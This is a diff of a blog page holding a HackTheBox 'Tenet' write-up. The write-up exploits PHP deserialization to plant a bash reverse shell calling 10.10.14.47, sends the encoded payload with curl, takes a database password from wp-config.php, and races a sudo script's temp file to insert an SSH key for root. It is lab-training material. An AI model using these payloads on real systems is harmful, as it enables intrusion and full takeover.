@@ -6,30 +6,31 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
 <title>Hackthebox Tenet - Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="Hackthebox - Tenet Writeup" />
       <meta property="og:description" content="A medium difficulty hackthebox machine, exploited using PHP object deserialization, and a basic root privesc." />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/htb_tenet/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/htb_tenet/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,39 +40,54 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#hackthebox-tenet---writeup">Hackthebox Tenet - Writeup</a></li>
-    <li><a href="#nmap-scan">Nmap Scan</a></li>
-    <li><a href="#enumeration">Enumeration</a>
-    <ul>
-    <li><a href="#port-80---wordpress-blogsite">Port 80 - wordpress blogsite</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---user">Privilege Escalation - User</a></li>
-    <li><a href="#privilege-escalation---root">Privilege Escalation - Root</a></li>
-    </ul>
-</nav>
+<ul>
+<li><a href="#hackthebox-tenet---writeup">Hackthebox Tenet -
+Writeup</a></li>
+<li><a href="#nmap-scan">Nmap Scan</a></li>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-80---wordpress-blogsite">Port 80 - wordpress
+blogsite</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---user">Privilege Escalation -
+User</a></li>
+<li><a href="#privilege-escalation---root">Privilege Escalation -
+Root</a></li>
+</ul>
 <h1 id="hackthebox-tenet---writeup">Hackthebox Tenet - Writeup</h1>
 <h1 id="nmap-scan">Nmap Scan</h1>
 <ul>
-<li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />
+<li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;
+protocol 2.0)<br />
 </li>
 <li>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</li>
 </ul>
 <h1 id="enumeration">Enumeration</h1>
 <h2 id="port-80---wordpress-blogsite">Port 80 - wordpress blogsite</h2>
-<p>Looking around the site, we find a comment by a user <code>neil</code> on the post “Migration”. The comment is as follows:</p>
-<div class="sourceCode" id="cb1"><pre class="sourceCode txt"><code class="sourceCode default"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>did you remove the sator php file and the backup?? the migration program is</span>
+<p>Looking around the site, we find a comment by a user
+<code>neil</code> on the post “Migration”. The comment is as
+follows:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode txt"><code class="sourceCode default"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>did you remove the sator php file and the backup?? the migration program is</span>
 <span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>incomplete! why would you do this?!</span></code></pre></div>
-<p>So, there is some sort of a backup site and a file called <code>sator.php</code>(?). Fuzzing for the file in tenet.htb, we couldn’t find anything.</p>
-<p>There might be virtual hosting on the site. So we try adding <code>sator.tenet.htb</code> to our /etc/hosts file. And going over to sator.tenet.htb, we find the apache2 default webpage. Now, going to the URI <code>http://sator.tenet.htb/sator.php</code>, we find the following.</p>
+<p>So, there is some sort of a backup site and a file called
+<code>sator.php</code>(?). Fuzzing for the file in tenet.htb, we
+couldn’t find anything.</p>
+<p>There might be virtual hosting on the site. So we try adding
+<code>sator.tenet.htb</code> to our /etc/hosts file. And going over to
+sator.tenet.htb, we find the apache2 default webpage. Now, going to the
+URI <code>http://sator.tenet.htb/sator.php</code>, we find the
+following.</p>
 <p><img src="/img/htb_tenet/1.png" /></p>
-<p>So the php file is there, and it is getting executed. Since, there was a mention of some backup, we try getting the file <code>sator.php.bak</code>. And we see that, it does have a file in the same name. We download it to our local machine</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://sator.tenet.htb/sator.php.bak</span></code></pre></div>
+<p>So the php file is there, and it is getting executed. Since, there
+was a mention of some backup, we try getting the file
+<code>sator.php.bak</code>. And we see that, it does have a file in the
+same name. We download it to our local machine</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://sator.tenet.htb/sator.php.bak</span></code></pre></div>
 <p>And analyze the code.</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// sator.php</span></span>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// sator.php</span></span>
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ot">?</span>php</span>
 <span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">D</span>atabaseExport</span>
@@ -103,31 +119,59 @@
 <span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
-<p>Here we see that the script looks for a GET input variable <code>arepo</code> and unserializes it. We might be able to exploit it using <strong>PHP Object Deserialization.</strong> <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">Here</a> is a blogpost on this topic that has a detail explanation.</p>
-<p>Here is a class called <code>DatabaseExport</code> with a <code>__destruct</code> function implemented. This function is what we can use to get RCE. The function uses <code>file_put_contents</code> to write the variable <code>data</code> to the file defined in the variable <code>user_file</code>. If we go over to the URI sator.tenet.htb/users.txt, we see that the file exists and prints SUCCESS.</p>
+<p>Here we see that the script looks for a GET input variable
+<code>arepo</code> and unserializes it. We might be able to exploit it
+using <strong>PHP Object Deserialization.</strong> <a
+href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">Here</a>
+is a blogpost on this topic that has a detail explanation.</p>
+<p>Here is a class called <code>DatabaseExport</code> with a
+<code>__destruct</code> function implemented. This function is what we
+can use to get RCE. The function uses <code>file_put_contents</code> to
+write the variable <code>data</code> to the file defined in the variable
+<code>user_file</code>. If we go over to the URI
+sator.tenet.htb/users.txt, we see that the file exists and prints
+SUCCESS.</p>
 <p>Now, to exploit this, we can do the following:</p>
 <ol type="1">
-<li><p>We write the class DatabaseExport on our local machine, define user_file to be a php file and the data to be a php reverse shell to our local machine.</p></li>
-<li><p>We serialize our defined class and pass it as input to the GET variable <code>variable</code>.</p></li>
-<li><p>The input gets passed to <code>deserialize</code> and a new instance of the class is created with our defined variables.</p></li>
-<li><p>At the __destruct function, our reverse shell gets written to the root of the web directory to the filename defined by us(rce.php in my case). Now if we go to the URI of the file, we can get a reverse shell.</p></li>
+<li><p>We write the class DatabaseExport on our local machine, define
+user_file to be a php file and the data to be a php reverse shell to our
+local machine.</p></li>
+<li><p>We serialize our defined class and pass it as input to the GET
+variable <code>variable</code>.</p></li>
+<li><p>The input gets passed to <code>deserialize</code> and a new
+instance of the class is created with our defined variables.</p></li>
+<li><p>At the __destruct function, our reverse shell gets written to the
+root of the web directory to the filename defined by us(rce.php in my
+case). Now if we go to the URI of the file, we can get a reverse
+shell.</p></li>
 </ol>
-<p>So now, we write the class, serilize it and urlencode it to pass to the GET variable. We open a php interactive cli using</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-a</span></span></code></pre></div>
+<p>So now, we write the class, serilize it and urlencode it to pass to
+the GET variable. We open a php interactive cli using</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-a</span></span></code></pre></div>
 <p>we write the following</p>
-<div class="sourceCode" id="cb5"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">D</span>atabaseExport {</span>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> <span class="cn">D</span>atabaseExport {</span>
 <span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="va">$user_file</span> <span class="op">=</span> <span class="st">&#39;rce.php&#39;</span><span class="ot">;</span></span>
 <span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">public</span> <span class="va">$data</span> <span class="op">=</span> <span class="st">&#39;&lt;?php exec(&quot;/bin/bash -c </span><span class="sc">\&#39;</span><span class="st">bash -i &gt; /dev/tcp/10.10.14.47/5555 0&gt;&amp;1</span><span class="sc">\&#39;</span><span class="st">&quot;); ?&gt;&#39;</span><span class="ot">;</span></span>
 <span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  }</span>
 <span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="kw">print</span> <span class="fu">urlencode</span>(<span class="fu">serialize</span>(<span class="kw">new</span> <span class="cn">D</span>atabaseExport))<span class="ot">;</span></span></code></pre></div>
-<p>We copy the output of the print command and pass it to the GET variable using curl.</p>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-i</span> http://sator.tenet.htb/sator.php<span class="pp">?</span>arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.47%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D</span></code></pre></div>
-<p>We open a nc listener on port 5555 and get a reverse shell by browsing the URI <code>http://sator.tenet.htb/rce.php</code>.</p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 5555</span></code></pre></div>
+<p>We copy the output of the print command and pass it to the GET
+variable using curl.</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-i</span> http://sator.tenet.htb/sator.php<span class="pp">?</span>arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.47%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D</span></code></pre></div>
+<p>We open a nc listener on port 5555 and get a reverse shell by
+browsing the URI <code>http://sator.tenet.htb/rce.php</code>.</p>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lnvp</span> 5555</span></code></pre></div>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
-<p>We find ourselves in the <code>html</code> directory. Going over to the <code>wordpress</code>directory, we find the config file <code>wp-config.php</code>. Cat-ing out the contents, we find a password for the user neil</p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">/** MySQL database username */</span></span>
+<p>We find ourselves in the <code>html</code> directory. Going over to
+the <code>wordpress</code>directory, we find the config file
+<code>wp-config.php</code>. Cat-ing out the contents, we find a password
+for the user neil</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">/** MySQL database username */</span></span>
 <span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="fu">define</span>( <span class="st">&#39;DB_USER&#39;</span><span class="ot">,</span> <span class="st">&#39;neil&#39;</span> )<span class="ot">;</span></span>
 <span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="co">/** MySQL database password */</span></span>
@@ -139,11 +183,15 @@
 <p>We ssh into user neil.</p>
 <h1 id="privilege-escalation---root">Privilege Escalation - Root</h1>
 <p>Root privilege escalation is pretty straight forward.</p>
-<p>We check what sudo capabilities our user has got using <code>sudo -l</code> and find the following.</p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">User</span> neil may run the following commands on tenet:</span>
+<p>We check what sudo capabilities our user has got using
+<code>sudo -l</code> and find the following.</p>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">User</span> neil may run the following commands on tenet:</span>
 <span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">(</span><span class="ex">ALL</span> : ALL<span class="kw">)</span> <span class="ex">NOPASSWD:</span> /usr/local/bin/enableSSH.sh</span></code></pre></div>
-<p>We have read permissions for the file /usr/local/bin/enableSSH.sh. Checking the file, the following function is interesting.</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">addKey()</span> <span class="kw">{</span></span>
+<p>We have read permissions for the file /usr/local/bin/enableSSH.sh.
+Checking the file, the following function is interesting.</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">addKey()</span> <span class="kw">{</span></span>
 <span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="va">tmpName</span><span class="op">=</span><span class="va">$(</span><span class="fu">mktemp</span> <span class="at">-u</span> /tmp/ssh-XXXXXXXX<span class="va">)</span></span>
 <span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
@@ -157,12 +205,24 @@
 <span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>        <span class="ex">/bin/rm</span> <span class="va">$tmpName</span></span>
 <span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="er">}</span></span></code></pre></div>
-<p>What this script does is writes a id_rsa.pub key defined in key to a randomly generated file of format <code>/tmp/ssh-XXXXXXXX</code> and then copies the contents of the file to the <code>known_hosts</code> of the root. And then deletes the tmp file.</p>
-<p>So, if we can write our own ssh key to the tmp file before it gets copied to known_hosts, our key will get written to known_hosts and we can ssh into root. So we write an infinite while loop in bash that continuously writes our ssh key to any file of format <code>/tmp/ssh-XXXXXXXX</code> using wild character. And while this runs, we run the script as sudo a number of times as we cannot be sure, if the key got written before the file getting removed.</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="fu">true</span><span class="kw">;</span> <span class="cf">do</span> <span class="bu">echo</span> <span class="st">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhwQE3BL3VcaiJcQ3X6pEF841mBSpD*************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************IGnYgLXPDKmIwqC2nngvAVo7BLa+YzHy+9fuMs= root@kali&quot;</span> <span class="kw">|</span> <span class="fu">tee</span> /tmp/ssh<span class="pp">*</span> <span class="op">&gt;</span> /dev/null<span class="kw">;</span> <span class="cf">done</span></span></code></pre></div>
-<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> /usr/local/bin/enableSSH.sh</span></code></pre></div>
-<p>After running the script for a number of times, we check if we cann ssh into root. And yes, we got in.</p>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span></code></pre></div>
+<p>What this script does is writes a id_rsa.pub key defined in key to a
+randomly generated file of format <code>/tmp/ssh-XXXXXXXX</code> and
+then copies the contents of the file to the <code>known_hosts</code> of
+the root. And then deletes the tmp file.</p>
+<p>So, if we can write our own ssh key to the tmp file before it gets
+copied to known_hosts, our key will get written to known_hosts and we
+can ssh into root. So we write an infinite while loop in bash that
+continuously writes our ssh key to any file of format
+<code>/tmp/ssh-XXXXXXXX</code> using wild character. And while this
+runs, we run the script as sudo a number of times as we cannot be sure,
+if the key got written before the file getting removed.</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="fu">true</span><span class="kw">;</span> <span class="cf">do</span> <span class="bu">echo</span> <span class="st">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhwQE3BL3VcaiJcQ3X6pEF841mBSpD*************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************IGnYgLXPDKmIwqC2nngvAVo7BLa+YzHy+9fuMs= root@kali&quot;</span> <span class="kw">|</span> <span class="fu">tee</span> /tmp/ssh<span class="pp">*</span> <span class="op">&gt;</span> /dev/null<span class="kw">;</span> <span class="cf">done</span></span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> /usr/local/bin/enableSSH.sh</span></code></pre></div>
+<p>After running the script for a number of times, we check if we cann
+ssh into root. And yes, we got in.</p>
 </article>
 
 <footer>
